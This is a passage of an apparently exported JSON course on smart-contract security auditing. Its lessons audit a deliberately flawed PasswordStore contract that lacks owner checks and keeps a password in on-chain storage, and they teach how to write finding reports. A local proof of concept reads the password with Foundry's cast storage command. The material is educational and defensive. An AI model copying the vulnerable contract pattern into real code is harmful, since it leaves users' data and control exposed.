src=\"/security-section-3/8-understanding-code/understanding2.png\" style=\"width: 100%; height: auto;\">\n\nEverything looks great so far, the client is using some clear standard naming conventions.\n\n**Hypothetically**, were the naming conventions poor, we might want to make an informational note.\n\n```js\ncontract PasswordStore {\n    // I - naming convention could be more clear ie 'error PasswordStore__NotOwner();'\n    error NotOwner();\n}\n```\n\nIn the example above we use `// I` for `informational` findings, but use what feels right for you.\n\n> **Pro Tip** - I like to use a package called [**headers**](https://github.com/transmissions11/headers) by `transmissions11`. It allows me to clearly label areas of a repo I'm reviewing.\n\n## Looking at Functions\n\nAlright, we've reached the functions of this protocol. Let's assess the `setPassword()` function first. Fortunately, we again have `NatSpec` to consider.\n\n```js\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\nSometimes a protocol won't have clear documentation like the above. This is where clear lines of communication between the security reviewer and the client are fundamental, as Tincho advised.\n\nWere things less clear, it may be appropriate to leave a note to ask the client.\n\n```js\n// Q What's this function do?\n```\n\nIt can't be stressed enough, clarity in our understanding of the codebase and the intended functionalities are a _necessary_ part of performing a security review.\n\n### Wrap Up\n\nThis has been a great start getting our hands on the code and applying a critical/adversarial frame of mind. You may already have spotted a vulnerability, we'll be taking a closer look in our next lesson!\n",
          "updates": []
        },
        {
          "lessonId": "1bc03555-0cb0-4d70-b9ee-eab97e748943",
          "number": 9,
          "title": "Exploit: Access control",
          "slug": "access-control",
          "folderName": "9-access-control",
          "description": "",
          "duration": 3,
          "videoUrl": "iAYbiPR8PadCov18QADc49PfsLUzK9SHE4J7gaZ8z9s",
          "rawMarkdownUrl": "/routes/security/3-first-audit/9-access-control/+page.md",
          "markdownContent": "---\ntitle: Exploit Access Controls\n---\n\n_Follow along with this video:_\n\n---\n\n### The First Vulnerability\n\nAlready you may have spotted a vulnerability in this function. Take a moment before reading on to try to find it.\n\n```js\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\nThe function's `NatSpec` gives us a clear `invariant` - \"..only the owner..\". This should serve as a clue for what to look for and we should as ourselves...\n\n> _Can anyone **other** than the **owner** call this function?_\n\nAt first glance, there doesn't seem to be anything preventing this. I think we've found something! Let's be sure to make notes of our findings as we go.\n\n```js\n    /*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    // @Audit - High - any user can set a password.\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\n> **Note**: We'll explain `High` and how to determine a finding's severity later in the course.\n\n### The Bug Explained\n\nWhat we've found is a fairly common vulnerability that protocols overlook. `Access Control` effectively describes a situation where inadequate or inappropriate limitations have been places on a user's ability to perform certain actions.\n\nIn our simple example - only the owner of the protocol should be able to call `setPassword()`, but in its current implementation, this function can be called by anyone.\n\nI'll stress again the value of taking notes throughout this process. In-line comments, formatted properly are going to make returning to these vulnerabilities later for reassessment much easier and will keep you organized as you go.\n\n```js\n// @Audit - Any user can set a password - Access Control\n```\n\nClear and concise notes are key.\n\n### Wrapping Up\n\nWe did it! We found our first vulnerability. Don't worry if you couldn't spot the issue on your own, much of security research is familiarizing ourselves with these bugs and educating ourselves to more readily spot issues in the future. Experience goes a _long_ way.\n\nWe also emphasized the importance of taking notes as we perform our review. This allows us clear reference to these areas of concern later in the audit.\n\nLet's see if we can find more bugs in the next lesson!\n",
          "updates": []
        },
        {
          "lessonId": "43ba5486-bd51-4a1f-b203-52cf1a2fea7c",
          "number": 10,
          "title": "Exploit: Public Data",
          "slug": "exploit-public-data",
          "folderName": "10-exploit-public-data",
          "description": "",
          "duration": 3,
          "videoUrl": "sEgUDhLqFIH3UOtAIv2n24BJ6wpKvf7d8WfFh991QC00",
          "rawMarkdownUrl": "/routes/security/3-first-audit/10-exploit-public-data/+page.md",
          "markdownContent": "---\ntitle: Exploit Public Data\n---\n\n_Follow along with this video:_\n\n---\n\n###\n\nAlright, one function down, one to go. Let's take a look at what's next.\n\n```js\n/*\n* @notice This allows only the owner to retrieve the password.\n* @param newPassword The new password to set.\n*/\nfunction getPassword() external view returns (string memory) {\n    if (msg.sender != s_owner) {\n    revert PasswordStore__NotOwner();\n    }\n    return s_password;\n}\n```\n\nStarting, starting as always with the `NatSpec` documentation, we see a couple things to note:\n\n- Only the owner should be able to retreive the password (_your `access control` bells should be ringing_)\n- The function should take the parameter `newPassword`.\n\nWe see a problem on the very next line. This function _doesn't take_ a parameter. Certainly informational, but let's make a note of it.\n\n```js\n/*\n* @notice This allows only the owner to retrieve the password.\n// @Audit - parameter not used by function, NatSpec can be removed\n* @param newPassword The new password to set.\n*/\n```\n\nLet's take a look at the function itself.\n\n<img src=\"/security-section-3/10-exploit-public-data/public-data1.png\" style=\"width: 100%; height: auto;\">\n\nThe function looks great! Adhering to the required access control, we can be sure only the owner can call this function.\n\nSo we're done, right? Web3 is secure! ðŸ¥³\n\n...\n\nWell, not exactly. There's another issue hidden in this contract and I want you to take a moment before continuing to try to find it.\n\nI'll give you a hint: `State Variables`.\n\n...\n\n<details closed>\n<summary>The Vulnerability</summary>\n <img src=\"/security-section-3/10-exploit-public-data/public-data2.png\" style=\"width: 100%; height: auto;\">\n\nWe've uncovered a major flaw in the business logic of this protocol. It's best we make a note of this.\n\n```js\naddress private s_owner;\n// @Audit - s_password variable is not actually private! Everything on the blockchain is public, this is not a safe place to store your password.\nstring private s_password;\n```\n\n</details>\n\n### Wrap up\n\nIf you're unsure how it's possible for someone to read this data, don't worry - we'll be writing a proof of code to show how it's done. This is something covered in our [**Foundry Course**](https://updraft.cyfrin.io/courses/advanced-foundry) however, consider a refresher if this is entirely new to you as we'll be building on these concepts later on.\n",
          "updates": []
        },
        {
          "lessonId": "2f9c6946-6eb1-4d65-be39-a4fb99a76125",
          "number": 11,
          "title": "Recap II",
          "slug": "recap-ii",
          "folderName": "11-recap-ii",
          "description": "",
          "duration": 1,
          "videoUrl": "THQHBVMjwuQ00M3t1vk8Ynb700yZCa8ecZ9DXt5rnfutc",
          "rawMarkdownUrl": "/routes/security/3-first-audit/11-recap-ii/+page.md",
          "markdownContent": "---\ntitle: Recap II\n---\n\n_Follow along with this video:_\\\n\n---\n\nLet's recap a few of the things we've found while reviewing this protocol so far.\n\n### Vulnerability #1\n\nFirst, we found that the `setPassword()` function, while intending to only callable by the `owner`, has no check to ensure this.\n\n```js\nfunction setPassword(string memory newPassword) external {\n    s_password = newPassword;\n    emit SetNetPassword();\n}\n```\n\nThis is an `Access Control` vulnerability, allowing anyone to change the password saved, at any time. A proper check for this might look like:\n\n```js\nfunction setPassword(string memory newPassword) external {\n  if (msg.sender !== s_owner) {\n  revert PasswordStore__NotOwner;\n  }\n  s_password = newPassword;\n  emit SetNetPassword();\n}\n\n```\n\nThe above check will assure the function reverts if the caller is not the `owner`. Keep this in mind for our mitigation section of our report!\n\n### Vulnerability 2\n\nThe second issue we came across in our review was something likely informational, but none the less good to note. The `NatSpec` of our `getPassword()` function reads:\n\n```js\n/*\n * @notice This allows only the owner to retrieve the password.\n * @param newPassword The new password to set.\n */\n```\n\nWe noted that the `getPassword()` function doesn't take the described parameter, as such this line of documentation should be removed.\n\n### Vulnerability 3\n\nLast but definitely not least, we noticed that the application stored passwords on-chain. This is a major security concern as **all data on-chain is public information**. The business logic of this protocol is flawed!\n\n```js\nstring private s_password; //This is not secure!\n```\n\n> _**Remember**: all data stored on-chain is publicly accessible. Sensitive data must necessarily be kept off-chain._\n\n### Wrap Up\n\nTo sum up our findings:\n\n- Access Control on `setPassword()` function.\n- Inaccurate `NatSpec` for `getPassword()` function.\n- Private variables aren't `hidden` - all data is publicly accessible, breaking the protocol logic.\n\nGreat work in spotting these vulnerabilities! We've already shown that we're capable of making this protocol more secure.\n\nIn the next lesson we're going to go over some test assessment.\n",
          "updates": []
        },
        {
          "lessonId": "98ac9db5-d6b3-4d8f-bc83-9ddfe3b4a322",
          "number": 12,
          "title": "Protocol tests",
          "slug": "protocol-tests",
          "folderName": "12-protocol-tests",
          "description": "",
          "duration": 3,
          "videoUrl": "ESXGvNkUbo2pk00w1u01Ksl1GhmIoA3zEuISqRTiUaKaw",
          "rawMarkdownUrl": "/routes/security/3-first-audit/12-protocol-tests/+page.md",
          "markdownContent": "---\ntitle: Protocol Tests\n---\n\n_Follow along with this video:_\n\n---\n\n<img src=\"/security-section-3/12-protocol-tests/protocol-tests1.png\" style=\"width: 100%; height: auto;\">\n\nAs security researchers our job is to ultimatly do what's necessary to make a protocol more secure. While we've thoroughly examined everything within scope of `PasswordStore` there can be some value in expanding our recon.\n\nTest suites should be an expectation of any protocol serious about security, assuring adequate test coverage will be valuable in a `private audit`.\n\n## Testing and Coverage\n\nAnyone at this stage of the course should be familiar with how to check the `test coverage` of a repo.\n\n```bash\nforge build\nforge test\n```\n\nThe above will run all current tests, to check `coverage` we'll use:\n\n```bash\nforge coverage\n```\n\n<img src=\"/security-section-3/12-protocol-tests/protocol-tests2.png\" style=\"width: 100%; height: auto;\">\n\nWow! Our coverage looks great...right? It's important to note that coverage may be a vanity metric and not truly representative of what's being tested for. If we look closely at the tests included, we can see the a major vulnerability we found (`Access Control`) wasn't tested for at all.\n\n```js\nfunction test_owner_can_set_password() public {\n    vm.startPrank(owner);\n    string memory expectedPassword = \"myNewPassword\";\n    passwordStore.setPassword(expectedPassword);\n    string memory actualPassword = passwordStore.getPassword();\n    assertEq(actualPassword, expectedPassword);\n}\n\nfunction test_non_owner_reading_password_reverts() public {\n    vm.startPrank(address(1));\n\n    vm.expectRevert(PasswordStore.PasswordStore__NotOwner.selector);\n    passwordStore.getPassword();\n}\n```\n\nIn addition to the above, tests aren't going to catch problems with documentation, or erroneous business logic. It's important not to assume things are fine because our framework tells us so.\n\n### Wrap Up\n\nWe're really progressing through this process well and we're ready to write a report for each of our findings. We'll cover this in our next lesson!\n",
          "updates": []
        },
        {
          "lessonId": "96f8af07-f18f-4682-864f-cef0a6abc240",
          "number": 13,
          "title": "Writing an amazing finding",
          "slug": "finding-report",
          "folderName": "13-finding-report",
          "description": "",
          "duration": 4,
          "videoUrl": "DYHxa01R7uH6pzvyGoeEZXZqb7632xGQdNEVkS3B4Ls00",
          "rawMarkdownUrl": "/routes/security/3-first-audit/13-finding-report/+page.md",
          "markdownContent": "---\ntitle: Writing an amazing finding report\n---\n\n_Follow along with this video:_\n\n---\n\n### Phase #4: Reporting\n\nAfter the identification phase, we are tasked with communicating our findings to the protocol. This phase is crucial on several levels:\n\n1. We need to convince the protocol that the identified vulnerabilities are valid.\n2. We must illustrate how severe/impactful the issue is\n3. We should also help the protocol with mitigation strategies.\n\nBy effectively communicating this information, we position ourselves as educators, helping the protocol understand **why** these vulnerabilities are issues, **why** they were overlooked, and **how** to fix them to avoid running into the same issues in the future.\n\n### Writing Your First Finding\n\nNow comes an incredibly exciting part - doing a minimalistic write up of the vulnerabilities you've found.\n\nWe've prepared a finding template for you, accessible in the course's [**GitHub Repo**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/finding_layout.md).\n\nOpen a new file in your project titled `audit-data`, download and copy `finding_layout.md` into this folder.\n\nIt should look like this when previewed (`CTRL + SHIFT + V`):\n\n---\n\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\nYou can customize this however you like, but this minimalistic template is a great starting point.\n\n> Remember our goals in this report:\n>\n> - illustrate that the issue is valid\n> - make clear the issue's severity and impact\n> - offer recommendation for mitigation\n\n### Wrap up\n\nCreate a copy of `findings_layout.md`, name it `findings.md` and let's start filling these sections out.\n\nOur first finding is `Private variable's aren't actually private!`\n",
          "updates": []
        },
        {
          "lessonId": "508a9bbd-9427-41bb-a5be-3e6c63cfeaba",
          "number": 14,
          "title": "Writing an amazing finding: Title",
          "slug": "an-amazing-title",
          "folderName": "14-an-amazing-title",
          "description": "",
          "duration": 2,
          "videoUrl": "8DClGnjCCFH00W4MEvC00EB7oTDcAL02QzZnxqOR5U0002Cs",
          "rawMarkdownUrl": "/routes/security/3-first-audit/14-an-amazing-title/+page.md",
          "markdownContent": "---\ntitle: An Amazing Title\n---\n\n_Follow along with this video:_\n\n---\n\n### The report so far:\n\n---\n\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\n### Title\n\nThe first thing we need to fill out is our report's title. We want to be concise while still communicating important details of the vulnerability. A good rule of thumb is that your title should include:\n\n> Root Cause + Impact\n\nSo, we ask ourselves _what is the root cause of this finding, and what impact does it have?_\n\nFor this finding the root cause would be something aking to:\n\n- **Storage variables on-chain are publicly visible**\n\nand the impact would be:\n\n- **anyone can view the stored password**\n\nLet's work this into an appropriate title for our finding (don't worry about `[S-#]`, we'll explain this more later).\n\n---\n\n```\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n```\n\n---\n\n### Wrap Up\n\nThe easiest way to ensure a clear title of your report is to be concise and adhere to the rule of thumb.\n\n> Root Cause + Impact\n\nOne step down! Let's move onto the description section next\n",
          "updates": []
        },
        {
          "lessonId": "9620492b-6c47-44bb-80c4-48b43dd53f94",
          "number": 15,
          "title": "Writing an amazing finding: Description",
          "slug": "description",
          "folderName": "15-description",
          "description": "",
          "duration": 4,
          "videoUrl": "CbPeHWYYC3Ksldo9pLi00J008mQCYO2epKYrdxpWTgGds",
          "rawMarkdownUrl": "/routes/security/3-first-audit/15-description/+page.md",
          "markdownContent": "---\ntitle: Description\n---\n\n_Follow along with this video:_\n\n---\n\n### The report so far:\n\n---\n\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\nAlright, `title` done. What's next? Let's take a look at description and impact.\n\n### Description\n\nOur goal here is to describe the vulnerability consicely while clearly illustrating the problem. A description for our finding here might look like this.\n\n---\n\n```\n**Description:** All data stored on chain is public and visible to anyone. The s_password variable is intended to be hidden and only accessible by the owner through the getPassword function.\n\nI show one such method of reading any data off chain below.\n```\n\n---\n\nThis looks good, but we can do even better. The bigger a codebase, the more our variables and references are going to get lost. We can fight this with a little bit of markdown formatting and standardizing our naming conventions.\n\n<img src=\"/security-section-3/15-description/description1.png\" style=\"width: 100%; height: auto;\">\n\nConsider the above adjustments to our references in the description. By wrapping the variable and function name in backticks we're able to highlight them. Additionally we're prepended the names with reference to the contract in which they're found.\n\n---\n\n```\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n\nI show one such method of reading any data off chain below.\n```\n\n---\n\nThis is the kind of clarity we should strive for in our reports!\n\n### Impact\n\nThe impact is fairly self-evident, but to articulate it:\n\n```\n**Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.\n```\n\nPutting things together, our report so far should look like this\n\n---\n\n```\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n\nI show one such method of reading any data off chain below.\n\n**Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n```\n\n---\n\n### Wrap Up\n\nIn the next lesson, we're going to go over `Proof of Concept` sometimes called `Proof of Code`. This is a critical section of our report where we show, irrefutably, that the vulnerability exists and has considerable impact.\n\nThis is the section that prevents protocols from disregarding legitmate concerns.\n\nLet's get to the code!\n",
          "updates": []
        },
        {
          "lessonId": "b77665e5-0308-4fc4-b3d3-0077c840bcae",
          "number": 16,
          "title": "Writing an amazing finding: Proof of code",
          "slug": "proof-of-code",
          "folderName": "16-proof-of-code",
          "description": "",
          "duration": 3,
          "videoUrl": "ZYae2hc9owgu7zUQiASt6KfTp7DZQIGMu6eFuY1Uf2w",
          "rawMarkdownUrl": "/routes/security/3-first-audit/16-proof-of-code/+page.md",
          "markdownContent": "---\ntitle: Proof of Code\n---\n\n_Follow along with this video:_\n\n---\n\n### The report so far:\n\n---\n\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n\nI show one such method of reading any data off chain below.\n\n**Impact:** Anyone is able to read the private password, severly breaking the functionality of the protocol.\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\n### Proof of Code/Concept\n\nOur report is looking great, but the next section, `Proof of Code/Concept`, is imperative. Let's go over how we programmatically prove the claim we're making - that anyone can read the protocol's stored password.\n\nFirst we need a local chain running.\n\n```bash\nforge anvil\n```\n\n> Note: Most PoC's won't require a local blockchain\n\nNext we need to deploy our protocol, fortunately, PasswordStore has a `make` command set up for us. Note that their deploy script is setting the password `myPassword` in the process. Open a new terminal and run the following.\n\n```bash\nmake deploy\n```\n\nFoundry allows us to check the storage of a deployed contract with a very simple `cast` command. For this we'll need to recall to which storage slot the `s_password` variable is assigned.\n\n<img src=\"/security-section-3/16-proof-of-code/proof-of-code1.png\" style=\"width: 100%; height: auto;\">\n\nWith this consideration we can run the command `cast storage <address> <storageSlot>` like this (_your address may be different_).\n\n```bash\ncast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1\n```\n\nWe should receive an output similar to this:\n\n```\n`0x6d7950617373776f726400000000000000000000000000000000000000000014`\n```\n\nThis is the bytes form of the data at `storage slot 1`. By using another convenient Foundry command we can now decode this data.\n\n```bash\ncast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014\n```\n\nOur output then becomes:\n\n```\nmyPassword\n```\n\nAnd we've done it. In a few quick commands we've shown that the data our client is expecting to keep hidden on chain is accessible to anyone. Let's add these steps as proof to our report. Things are getting long, so I've collapsed the report examples going forward!\n\n<details closed>\n<summary>Finding Report</summary>\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n<br>\n<br>\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n<br>\n<br>\nI show one such method of reading any data off chain below.\n<br>\n<br>\n**Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.\n<br>\n<br>\n**Proof of Concept:**The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.\n\n    Create a locally running chain\n\nmake anvil\n\n    Deploy the contract to the chain\n\nmake deploy\n\n    Run the storage tool\n\nWe use 1 because that's the storage slot of s_password in the contract.\n\n    cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545\n\nYou'll get an output that looks like this:\n\n    0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nYou can then parse that hex to a string with:\n\n    cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nAnd get an output of:\n\n    myPassword\n\n<br>\n**Recommended Mitigation:**\n\n</details>\n\n### Wrap Up\n\nWe've one more section in our report to fill out, the `Recommended Mitigations`. This is where we get a chance to illustrate our experience and bring value to the process by offering our expert advice on how rectify the problems faced by this vulnerability.\n\nLet's do it.\n",
          "updates": []
        },
        {
          "lessonId": "dce5ed84-3e1c-42f7-b8e8-9cf42bdab6e5",
          "number": 17,
          "title": "Recommended Mitigation",
          "slug": "recommended-mitigation",
          "folderName": "17-recommended-mitigation",
          "description": "",
          "duration": 2,
          "videoUrl": "Lia01zwicRN2QHaa2K1QOw00jExxTtuEJM5jzkwYaQNPQ",
          "rawMarkdownUrl": "/routes/security/3-first-audit/17-recommended-mitigation/+page.md",
          "markdownContent": "---\ntitle: Recommended Mitigation\n---\n\n_Follow along with this video:_\n\n---\n\n### The report so far:\n\n---\n\n<details closed>\n<summary>Finding Report</summary>\n\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n\nI show one such method of reading any data off chain below.\n\n**Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.\n\n**Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.\n\nCreate a locally running chain\n\n    make anvil\n\nDeploy the contract to the chain\n\n    make deploy\n\nRun the storage tool\n\n    cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545\n\n_We use 1 because that's the storage slot of `PasswordStore::s_password`._\n\nYou'll get an output that looks like this:\n\n    0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nYou can then parse that hex to a string with:\n\n    cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nAnd get an output of:\n\n    myPassword\n\n**Recommended Mitigation:**\n\n</details>\n\n---\n\n### Recommended Mitigation\n\nWe're nearly there. Next we have to pass on our expert experience with a recommendation that will keep this protocol safe!\n\nThis finding in `PasswordStore` kinda leaves us in a tough spot. We can't just suggest an adjustment to the code to fix things - the problem is fundamentally tied to the goals/architecture of the protocol. A recommendation in a situation like this might look like:\n\n---\n\n```\n**Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.\n```\n\n---\n\nI challenge you to write something you'd think is more appropriate, or better expresses what the protocol could do in a situation like this!\n\nHere's our report now:\n\n<details closed>\n<summary>Finding Report</summary>\n<br>\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n<br>\n<br>\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n<br>\n<br>\nI show one such method of reading any data off chain below.\n<br>\n<br>\n**Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.\n<br>\n<br>\n**Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.\n<br>\n<br>\n\nCreate a locally running chain\n\n    make anvil\n\nDeploy the contract to the chain\n\n    make deploy\n\nRun the storage tool\n\n    cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545\n\n<br>\n*We use 1 because that's the storage slot of `PasswordStore::s_password`.*\n<br>\n<br>\nYou'll get an output that looks like this:\n\n    0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nYou can then parse that hex to a string with:\n\n    cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nAnd get an output of:\n\n    myPassword\n\n<br>\n**Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.\n\n</details>\n\n### Wrap Up\n\nOur report is looking so professional! Let's recap everything in the next lesson before we move on to the next vulnerability we found.\n",
          "updates": []
        },
        {
          "lessonId": "4e462cd4-3ee0-4a34-ac26-a4d81a882732",
          "number": 18,
          "title": "Finding Writeup",
          "slug": "finding-writeup",
          "folderName": "18-finding-writeup",
          "description": "",
          "duration": 2,
          "videoUrl": "CtEwzh2krYHieRIi4Te5lA29h4r5e6Cgmtbm02YDutxc",
          "rawMarkdownUrl": "/routes/security/3-first-audit/18-finding-writeup/+page.md",
          "markdownContent": "---\ntitle: Finding Writeup Recap\n---\n\n_Follow along with this video:_\n\n---\n\n### Our Finding Report\n\n<details closed>\n<summary>Finding Report</summary>\n\n### [S-#] Storing the password on-chain makes it visible to anyone and no longer private\n\n**Description:** All data stored on chain is public and visible to anyone. The `PasswordStore::s_password` variable is intended to be hidden and only accessible by the owner through the `PasswordStore::getPassword` function.\n\nI show one such method of reading any data off chain below.\n\n**Impact:** Anyone is able to read the private password, severaly breaking the functionality of the protocol.\n\n**Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.\n\nCreate a locally running chain\n\n    make anvil\n\nDeploy the contract to the chain\n\n    make deploy\n\nRun the storage tool\n\n    cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545\n\n_We use 1 because that's the storage slot of `PasswordStore::s_password`._\n\nYou'll get an output that looks like this:\n\n    0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nYou can then parse that hex to a string with:\n\n    cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014\n\nAnd get an output of:\n\n    myPassword\n\n**Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the stored password. However, you're also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with this decryption key.\n\n</details>\n\n---\n\n### Recap\n\nOur finding report looks great. All we're missing is the severity (`[S-#]`), but we'll get to that shortly. Let's recap some of the important aspects we went over while compiling this report.\n\n### The Write-Up Structure\n\n1. **Title**: A title should be succinct and clear. A best practice is to adhere to the `Root Cause + Impact` rule of thumb.\n\n2. **Description**: This is a brief explanation of the problem, widely enhanced by using markdown and clear naming conventions for our variables.\n\n3. **Impact**: The impact should be clear and concise in how, in plain language, is describes the affects the vulnerability has on the protocol.\n\n4. **Proof of Code**: A vital part of a good report, this section proves how someone could exploit the detailed vulnerability by walking through the process programmatically.\n\n5. **Recommended Mitigation**: This is where our expertise shines. Our focus in the recommendation should be in making the protocol more secure, advising specific changes or considerations that should be made to mitigate the reported vulnerability and adding value by offering solutions instead of just pointing out problems.\n\n### Wrap Up\n\nOur report looks awesome, but there's more to do. No stopping now, let's dive into our `Access Control` finding as see what a finding report for it would look like. This shouldn't take long, we're practically experts already.\n",
          "updates": []
        },
        {
          "lessonId": "96541336-7d2a-4223-ae4b-cd0038bc99df",
          "number": 19,
          "title": "Access Control Writeup",
          "slug": "access-control-writeup",
          "folderName": "19-access-control-writeup",
          "description": "",
          "duration": 3,
          "videoUrl": "fpBbCzn33lNwFO002faSAcVjlHyfLhfI9EU02juP5QlOg",
          "rawMarkdownUrl": "/routes/security/3-first-audit/19-access-control-writeup/+page.md",
          "markdownContent": "---\ntitle: Access Control Write-up\n---\n\n_Follow along with this video:_\n\n### Clean Slate\n\nWe've got the experience now, let's add a clean template to our `findings.md` for our `Access Control` finding and start filling this out together.\n\nA reminder of the function in question and our empty template:\n\n```js\n/*\n     * @notice This function allows only the owner to set a new password.\n     * @param newPassword The new password to set.\n     */\n    function setPassword(string memory newPassword) external {\n        s_password = newPassword;\n        emit SetNetPassword();\n    }\n```\n\n---\n\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\n### Title\n\nWe know the rule of thumb (`Root Cause + Impact`). Let's ask ourselves, `What is the root cause of this vulnerability?` and `What is the impact of this?`\n\n- **Root Cause:** `setPassword` has no access control\n- **Impact:** non-owner can change the password.\n\nSo, our `Title` might look like this\n\n```\n[S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n```\n\n### Description\n\nI challenge you to write your own description for this vulnerability! Remember, it should be clear and concise, describing things in detail in plain language. When you're done, click below to see mine.\n\n<details open>\n<summary>My Description</summary>\n\n**Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`\n\n```js\nfunction setPassword(string memory newPassword) external {\n    // @Audit - There are no Access Controls.\n    s_password = newPassword;\n    emit SetNewPassword();\n}\n```\n\n</details>\n\n### Impact\n\nThe impact of our vulnerability should be pretty easy. Let's write it out now.\n\n```\n**Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality\n```\n\nLet's put things together in our report so far.\n\n---\n\n```\n### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password\n\n**Description:** The `PasswordStore::setPassword` function is set to be an `external` function, however the purpose of the smart contract and function's natspec indicate that `This function allows only the owner to set a new password.`\n\n'''\nfunction setPassword(string memory newPassword) external {\n    // @Audit - There are no Access Controls.\n    s_password = newPassword;\n    emit SetNewPassword();\n}\n'''\n\n**Impact:** Anyone can set/change the stored password, severly breaking the contract's intended functionality\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n```\n\n---\n\n### Wrap Up\n\nAlready our report looks incredibly professional. Next lesson we're applying our knowledge to construct a `Proof of Code`. Don't stop now!\n",
          "updates": []
        },
        {
          "lessonId": "53ba4e98-466b-4b5f-bdc3-28bc3fba6385",
          "number": 20,
          "title": "Missing Access Controls Proof Of Code",
          "slug": "missing-access-controls-proof-of-code",
          "folderName": "20-missing-access-controls-proof-of-code",
          "description": "",
          "duration": 5,
          "videoUrl": "ZoLuxe2JHLCa01K1CkZdQxTgbV1H9pg7yk00beEL023Q54",
          "rawMarkdownUrl": "/routes/security/3-first-audit/20-missing-access-controls-proof-of-code/+page.md",
